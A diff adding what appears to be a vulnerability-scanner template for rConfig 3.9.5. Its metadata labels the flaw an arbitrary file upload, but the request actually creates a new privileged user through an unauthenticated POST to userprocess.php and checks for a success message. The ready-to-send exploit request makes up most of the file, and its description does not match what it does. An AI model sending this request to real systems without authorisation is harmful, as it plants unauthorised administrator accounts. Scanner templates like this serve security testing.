@@ -1,0 +1,62 @@
+id: rconfig-file-upload
+brief:
+    title: rConfig 3.9.5 - Arbitrary File Upload
+    by: dwisiswant0
+    level: high
+    about: rConfig 3.9.5 is susceptible to an arbitrary file upload via the userprocess.php endpoint. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over ...
+    label:
+        - rconfig
+        - rce
+        - edb
+        - file-upload
+        - instrusive
+        - intrusive
+        - vuln
+    score: CVSS:8.8
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/lib/crud/userprocess.php'
+      head:
+        Accept: '*/*'
+        Content-Type: multipart/form-data; boundary=01b28e152ee044338224bf647275f8eb
+        Cookie: PHPSESSID={{randstr}}
+      body: |-
+        --01b28e152ee044338224bf647275f8eb
+        Content-Disposition: form-data; name="username"
+
+        {{randstr}}
+        --01b28e152ee044338224bf647275f8eb
+        Content-Disposition: form-data; name="passconf"
+
+        Testing1@
+        --01b28e152ee044338224bf647275f8eb
+        Content-Disposition: form-data; name="password"
+
+        Testing1@
+        --01b28e152ee044338224bf647275f8eb
+        Content-Disposition: form-data; name="email"
+
+        test@{{randstr}}.tld
+        --01b28e152ee044338224bf647275f8eb
+        Content-Disposition: form-data; name="editid"
+
+
+        --01b28e152ee044338224bf647275f8eb
+        Content-Disposition: form-data; name="add"
+
+        add
+        --01b28e152ee044338224bf647275f8eb
+        Content-Disposition: form-data; name="ulevelid"
+
+        9
+        --01b28e152ee044338224bf647275f8eb--
+      signs:
+        - "on": word
+          has:
+            - User {{randstr}} successfully added to Database
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 302
